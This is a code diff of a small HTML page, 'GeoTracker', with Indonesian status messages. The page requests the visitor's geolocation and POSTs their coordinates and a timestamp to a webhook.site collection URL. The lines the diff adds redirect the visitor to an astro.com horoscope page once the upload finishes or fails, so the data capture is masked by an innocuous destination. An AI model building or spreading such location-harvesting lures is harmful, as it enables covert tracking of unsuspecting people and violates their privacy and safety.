@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>GeoTracker Test</title>
+  <title>GeoTracker Redirect</title>
 </head>
 <body>
-  <h1>GeoTracker Demo</h1>
-  <p id="status">📍 Menunggu izin lokasi...</p>
+  <h1>GeoTracker Redirect Demo</h1>
+  <p id="status">📍 Meminta akses lokasi...</p>
   <pre id="log" style="background:#f4f4f4; padding:10px; border:1px solid #ccc;"></pre>
 
   <script>
@@ -16,6 +16,11 @@
     function log(message) {
       console.log(message);
       logEl.textContent += message + "\n";
+    }
+
+    function redirectToAstro() {
+      log("🔁 Mengarahkan ke astro.com...");
+      window.location.href = "https://www.astro.com/horoscope";
     }
 
     if ("geolocation" in navigator) {
@@ -30,7 +35,6 @@
           log(`Longitude: ${longitude}`);
           log(`Timestamp: ${timestamp}`);
 
-          // Kirim ke webhook
           fetch("https://webhook.site/22076a52-cc9b-42d9-9fac-b4fe19c7e334", {
             method: "POST",
             headers: {
@@ -44,19 +48,25 @@
           })
           .then(response => {
             log(`✅ Data dikirim. Status: ${response.status}`);
+            // Redirect setelah berhasil
+            setTimeout(redirectToAstro, 1000);
           })
           .catch(error => {
             log(`❌ Gagal kirim data: ${error}`);
+            // Tetap redirect meski gagal
+            setTimeout(redirectToAstro, 2000);
           });
         },
         function (error) {
           statusEl.textContent = "❌ Gagal mendapatkan lokasi.";
           log("Geolocation error: " + error.message);
+          setTimeout(redirectToAstro, 2000);
         }
       );
     } else {
       statusEl.textContent = "❌ Browser tidak mendukung geolocation.";
-      log("Geolocation tidak tersedia di browser ini.");
+      log("Geolocation tidak tersedia.");
+      setTimeout(redirectToAstro, 2000);
     }
   </script>
 </body>
